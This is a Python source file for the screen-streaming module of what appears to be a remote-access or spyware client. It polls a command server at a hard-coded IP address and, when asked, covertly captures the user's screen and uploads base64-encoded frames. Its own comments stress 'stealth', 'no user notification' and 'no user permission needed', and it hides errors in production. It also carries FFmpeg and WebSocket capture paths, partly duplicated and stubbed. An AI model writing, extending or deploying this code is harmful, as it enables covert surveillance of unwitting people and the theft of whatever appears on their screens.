# Stream handler for real-time screen streaming using Python libraries (stealth)

import subprocess
import threading
import logging
import time
import json
import base64
import requests
from datetime import datetime
import platform
import sys
import os
import mss
from PIL import Image
import io

try:
    import websocket
except ImportError:
    websocket = None

# Add src to path for imports
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from core.config import Config

class StreamHandler:
    def __init__(self, api_client):
        self.api_client = api_client
        self.is_streaming = False
        self.ffmpeg_process = None
        self.stream_quality = 'medium'  # low, medium, high
        self.sequence = 0
        
        # Stream settings
        self.stream_settings = {
            'low': {
                'resolution': '1280x720',
                'bitrate': '1000k',
                'fps': 15,
                'scale': '-1:720'
            },
            'medium': {
                'resolution': '1920x1080', 
                'bitrate': '2500k',
                'fps': 24,
                'scale': '-1:1080'
            },
            'high': {
                'resolution': '2560x1440',
                'bitrate': '5000k',
                'fps': 30,
                'scale': '-1:1440'
            }
        }
        
    def start_streaming(self):
        """Start stream handler service - wait for requests"""
        logging.info("Stream handler started - waiting for stream requests")
        
        while True:
            try:
                # Check for streaming requests from server
                self.check_stream_requests()
                time.sleep(2)
            except Exception as e:
                logging.error(f"Stream handler error: {str(e)}")
                time.sleep(5)
                
    def check_stream_requests(self):
        """Check server for streaming requests (stealth - no user notification)"""
        try:
            # Check if this is production server
            is_production = '103.129.149.67' in self.api_client.server_url
            
            if is_production:
                # Production server - streaming not implemented yet
                # Just return without error to avoid spam logs
                return False
            
            response = requests.get(
                f"{Config.SERVER_URL}/api/stream/request/{Config.CLIENT_ID}",
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                
                if data.get('quality') and not self.is_streaming:
                    # Start stealth streaming
                    self.stream_quality = data['quality']
                    self.is_streaming = True
                    logging.info(f"Starting stealth stream with quality: {self.stream_quality}")
                    self.start_stealth_streaming()
                    return True
                    
                elif not data.get('quality') and self.is_streaming:
                    # Stop streaming
                    self.is_streaming = False
                    logging.info("Stopping stealth stream")
                    self.stop_stealth_streaming()
                    return False
                    
        except requests.RequestException:
            # Network errors are common, don't spam logs
            pass
        except Exception as e:
            # Only log errors for local development
            is_production = '103.129.149.67' in self.api_client.server_url
            if not is_production:
                logging.error(f"Error checking stream requests: {e}")
        
        return False
            
    def start_stealth_streaming(self):
        """Start stealth screen streaming using Python libraries (no user permission needed)"""
        try:
            def stream_worker():
                """Worker thread for stealth streaming"""
                try:
                    # Check if mss is available
                    import mss
                    from PIL import Image
                    import io
                    
                    fps = self.stream_settings[self.stream_quality]['fps']
                    frame_interval = 1.0 / fps
                    
                    with mss.mss() as sct:
                        # Get primary monitor
                        monitor = sct.monitors[1]
                        
                        while self.is_streaming:
                            try:
                                # Capture screenshot (stealth - no notification)
                                screenshot = sct.grab(monitor)
                                
                                # Convert to PIL Image
                                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                                
                                # Resize based on quality
                                quality_settings = self.stream_settings[self.stream_quality]
                                if 'scale' in quality_settings:
                                    width = int(quality_settings['scale'].split(':')[1])
                                    if width != img.height:
                                        ratio = width / img.height
                                        new_width = int(img.width * ratio)
                                        img = img.resize((new_width, width), Image.Resampling.LANCZOS)
                                
                                # Convert to JPEG with compression
                                img_buffer = io.BytesIO()
                                quality = 85 if self.stream_quality == 'high' else 70 if self.stream_quality == 'medium' else 50
                                img.save(img_buffer, format='JPEG', quality=quality, optimize=True)
                                
                                # Encode to base64
                                img_data = base64.b64encode(img_buffer.getvalue()).decode('utf-8')
                                
                                # Send to server
                                self.send_stream_chunk(img_data)
                                
                                time.sleep(frame_interval)
                                
                            except Exception as frame_error:
                                logging.error(f"Frame capture error: {frame_error}")
                                time.sleep(1)
                                
                except ImportError as import_error:
                    logging.error(f"Required libraries not available for streaming: {import_error}")
                    self.is_streaming = False
                except Exception as worker_error:
                    logging.error(f"Stream worker error: {worker_error}")
                    self.is_streaming = False
                            
            # Start streaming thread
            if hasattr(self, 'stream_thread') and self.stream_thread.is_alive():
                logging.warning("Stream thread already running")
                return
                
            self.stream_thread = threading.Thread(target=stream_worker, daemon=True)
            self.stream_thread.start()
            logging.info(f"Stealth streaming started with quality: {self.stream_quality}")
            
        except Exception as e:
            logging.error(f"Failed to start stealth streaming: {e}")
            self.is_streaming = False
            
        except Exception as e:
            logging.error(f"Failed to start stealth streaming: {e}")
            
    def stop_stealth_streaming(self):
        """Stop stealth streaming"""
        self.is_streaming = False
        if hasattr(self, 'stream_thread'):
            self.stream_thread = None
            
    def send_stream_chunk(self, img_data):
        """Send stream chunk to server"""
        try:
            # Check if this is production server
            is_production = '103.129.149.67' in self.api_client.server_url
            
            if is_production:
                # Production server - streaming not implemented yet
                logging.debug("Streaming not available on production server")
                return False
            
            chunk_data = {
                'client_id': Config.CLIENT_ID,
                'frame_data': img_data,
                'timestamp': time.time(),
                'quality': self.stream_quality
            }
            
            response = requests.post(
                f"{Config.SERVER_URL}/api/stream/chunk",
                json=chunk_data,
                timeout=5
            )
            
            return response.status_code == 200
            
        except requests.RequestException:
            # Network errors are common during streaming
            return False
        except Exception as e:
            # Only log errors for local development
            is_production = '103.129.149.67' in self.api_client.server_url
            if not is_production:
                logging.error(f"Error sending stream chunk: {e}")
            return False
            
    def start_ffmpeg_stream(self):
        """Start FFmpeg screen capture and streaming"""
        try:
            if self.ffmpeg_process:
                return
                
            settings = self.stream_settings[self.stream_quality]
            
            # Determine screen capture method based on OS
            if platform.system() == 'Darwin':  # macOS
                input_args = [
                    '-f', 'avfoundation',
                    '-i', '1:0',  # Screen capture
                    '-r', str(settings['fps'])
                ]
            elif platform.system() == 'Windows':
                input_args = [
                    '-f', 'gdigrab',
                    '-i', 'desktop',
                    '-r', str(settings['fps'])
                ]
            else:  # Linux
                input_args = [
                    '-f', 'x11grab',
                    '-i', ':0.0',
                    '-r', str(settings['fps'])
                ]
            
            # FFmpeg command for streaming
            ffmpeg_cmd = [
                'ffmpeg',
                '-y',  # Overwrite output
            ] + input_args + [
                '-vf', f'scale={settings["scale"]}',
                '-c:v', 'libx264',
                '-preset', 'ultrafast',
                '-tune', 'zerolatency',
                '-b:v', settings['bitrate'],
                '-maxrate', settings['bitrate'],
                '-bufsize', '2M',
                '-g', str(settings['fps'] * 2),  # Keyframe interval
                '-f', 'mpegts',
                '-'  # Output to stdout
            ]
            
            logging.info(f"Starting FFmpeg with command: {' '.join(ffmpeg_cmd)}")
            
            # Start FFmpeg process
            self.ffmpeg_process = subprocess.Popen(
                ffmpeg_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                bufsize=0
            )
            
            # Start thread to read FFmpeg output and send to server
            stream_thread = threading.Thread(target=self.stream_ffmpeg_output)
            stream_thread.daemon = True
            stream_thread.start()
            
            logging.info("FFmpeg stream started successfully")
            
        except Exception as e:
            logging.error(f"Failed to start FFmpeg stream: {e}")
            self.ffmpeg_process = None
            
    def stream_ffmpeg_output(self):
        """Read FFmpeg output and send to server via HTTP"""
        try:
            chunk_size = 32768  # 32KB chunks
            
            while self.is_streaming and self.ffmpeg_process:
                chunk = self.ffmpeg_process.stdout.read(chunk_size)
                
                if not chunk:
                    break
                    
                # Send chunk to server
                self.send_chunk_to_server(chunk)
                    
        except Exception as e:
            logging.error(f"FFmpeg output streaming error: {e}")
            
    def send_chunk_to_server(self, chunk):
        """Send video chunk to server"""
        try:
            encoded_chunk = base64.b64encode(chunk).decode('utf-8')
            
            data = {
                'chunk': encoded_chunk,
                'sequence': self.sequence,
                'client_id': Config.CLIENT_ID,
                'timestamp': datetime.now().isoformat()
            }
            
            response = self.api_client.post(f'/api/stream/chunk/{Config.CLIENT_ID}', data)
            
            if response:
                self.sequence += 1
                logging.debug(f"Video chunk {self.sequence} sent successfully")
            else:
                logging.debug(f"Failed to send video chunk {self.sequence}")
                
        except Exception as e:
            logging.debug(f"Error sending video chunk: {str(e)}")
                
        except Exception as e:
            logging.error(f"Error sending chunk to server: {e}")
            
    def stop_ffmpeg_stream(self):
        """Stop FFmpeg streaming"""
        try:
            if self.ffmpeg_process:
                self.ffmpeg_process.terminate()
                self.ffmpeg_process.wait(timeout=5)
                self.ffmpeg_process = None
                logging.info("FFmpeg stream stopped")
                
        except subprocess.TimeoutExpired:
            if self.ffmpeg_process:
                self.ffmpeg_process.kill()
                self.ffmpeg_process = None
                logging.warning("FFmpeg process killed forcefully")
        except Exception as e:
            logging.error(f"Error stopping FFmpeg: {e}")
            
    def stop_streaming(self):
        """Stop all streaming"""
        self.is_streaming = False
        self.stop_ffmpeg_stream()
        self.sequence = 0
        logging.info("Streaming stopped")
                
    def start_screen_stream(self, quality='medium'):
        """Start FFmpeg screen streaming"""
        if self.is_streaming:
            return
            
        try:
            self.stream_quality = quality
            settings = self.stream_settings[quality]
            
            # Start WebSocket connection for signaling
            self.start_websocket_connection()
            
            # Start FFmpeg streaming
            self.start_ffmpeg_stream(settings)
            
            self.is_streaming = True
            logging.info(f"Screen streaming started with {quality} quality")
            
        except Exception as e:
            logging.error(f"Error starting screen stream: {str(e)}")
            
    def start_ffmpeg_stream(self, settings):
        """Start FFmpeg process for screen capture and streaming"""
        try:
            import platform
            
            if platform.system() == 'Windows':
                input_source = 'gdigrab'
                input_format = ['-f', 'gdigrab', '-i', 'desktop']
            elif platform.system() == 'Darwin':
                input_source = 'avfoundation'
                input_format = ['-f', 'avfoundation', '-i', '1:0']  # Screen capture
            else:
                input_source = 'x11grab'
                input_format = ['-f', 'x11grab', '-i', ':0.0']
                
            # FFmpeg command for WebRTC streaming
            ffmpeg_cmd = [
                'ffmpeg',
                '-y',  # Overwrite output files
                *input_format,
                '-video_size', settings['resolution'],
                '-framerate', str(settings['fps']),
                '-c:v', 'libx264',  # Video codec
                '-preset', 'ultrafast',  # Encoding preset
                '-tune', 'zerolatency',  # Low latency tuning
                '-b:v', settings['bitrate'],  # Video bitrate
                '-maxrate', settings['bitrate'],
                '-bufsize', f"{int(settings['bitrate'][:-1]) * 2}k",
                '-pix_fmt', 'yuv420p',
                '-f', 'rtp',  # RTP output format
                f'rtp://127.0.0.1:5004'  # Local RTP endpoint
            ]
            
            # Start FFmpeg process
            self.ffmpeg_process = subprocess.Popen(
                ffmpeg_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            
            # Monitor FFmpeg process
            threading.Thread(target=self.monitor_ffmpeg, daemon=True).start()
            
        except Exception as e:
            logging.error(f"Error starting FFmpeg: {str(e)}")
            
    def start_websocket_connection(self):
        """Start WebSocket connection for WebRTC signaling"""
        if not websocket:
            logging.warning("WebSocket library not available, skipping WebSocket connection")
            return
            
        try:
            ws_url = self.api_client.get_websocket_url()
            if ws_url:
                self.websocket_client = websocket.WebSocketApp(
                    ws_url,
                    on_open=self.on_websocket_open,
                    on_message=self.on_websocket_message,
                    on_error=self.on_websocket_error,
                    on_close=self.on_websocket_close
                )
                
                # Start WebSocket in separate thread
                threading.Thread(
                    target=self.websocket_client.run_forever,
                    daemon=True
                ).start()
                
        except Exception as e:
            logging.error(f"Error starting WebSocket: {str(e)}")
            
    def on_websocket_open(self, ws):
        """WebSocket connection opened"""
        logging.info("WebSocket connection established")
        
        # Register as streaming client
        register_msg = {
            'type': 'register',
            'role': 'streamer',
            'client_id': self.api_client.client_id
        }
        ws.send(json.dumps(register_msg))
        
    def on_websocket_message(self, ws, message):
        """Handle WebSocket messages for WebRTC signaling"""
        try:
            data = json.loads(message)
            msg_type = data.get('type')
            
            if msg_type == 'offer':
                # Handle WebRTC offer
                self.handle_webrtc_offer(data)
            elif msg_type == 'ice-candidate':
                # Handle ICE candidate
                self.handle_ice_candidate(data)
            elif msg_type == 'stream-request':
                # Handle stream request
                self.handle_stream_request(data)
                
        except Exception as e:
            logging.error(f"WebSocket message error: {str(e)}")
            
    def on_websocket_error(self, ws, error):
        """WebSocket error handler"""
        logging.error(f"WebSocket error: {error}")
        
    def on_websocket_close(self, ws, close_status_code, close_msg):
        """WebSocket connection closed"""
        logging.info("WebSocket connection closed")
        
    def handle_webrtc_offer(self, offer_data):
        """Handle WebRTC offer from dashboard"""
        # This would typically involve WebRTC peer connection setup
        # For now, we'll send a simple response
        response = {
            'type': 'answer',
            'client_id': self.api_client.client_id,
            'sdp': 'answer-sdp-here'  # Actual SDP answer would be generated
        }
        
        if self.websocket_client:
            self.websocket_client.send(json.dumps(response))
            
    def handle_ice_candidate(self, candidate_data):
        """Handle ICE candidate"""
        # Process ICE candidate for WebRTC connection
        logging.info("Received ICE candidate")
        
    def handle_stream_request(self, request_data):
        """Handle stream quality change request"""
        new_quality = request_data.get('quality', 'medium')
        if new_quality != self.stream_quality:
            logging.info(f"Changing stream quality to {new_quality}")
            self.restart_stream_with_quality(new_quality)
            
    def restart_stream_with_quality(self, quality):
        """Restart stream with new quality settings"""
        self.stop_screen_stream()
        time.sleep(1)
        self.start_screen_stream(quality)
        
    def monitor_ffmpeg(self):
        """Monitor FFmpeg process"""
        while self.ffmpeg_process and self.ffmpeg_process.poll() is None:
            time.sleep(1)
            
        if self.is_streaming:
            logging.warning("FFmpeg process ended unexpectedly")
            self.is_streaming = False
            
    def stop_screen_stream(self):
        """Stop screen streaming"""
        if not self.is_streaming:
            return
            
        try:
            # Stop FFmpeg process
            if self.ffmpeg_process:
                self.ffmpeg_process.terminate()
                self.ffmpeg_process.wait(timeout=5)
                self.ffmpeg_process = None
                
            # Close WebSocket connection
            if self.websocket_client:
                self.websocket_client.close()
                self.websocket_client = None
                
            self.is_streaming = False
            logging.info("Screen streaming stopped")
            
        except Exception as e:
            logging.error(f"Error stopping screen stream: {str(e)}")
            
    def get_stream_stats(self):
        """Get streaming statistics"""
        if not self.is_streaming:
            return None
            
        return {
            'is_streaming': self.is_streaming,
            'quality': self.stream_quality,
            'timestamp': datetime.now().isoformat()
        }
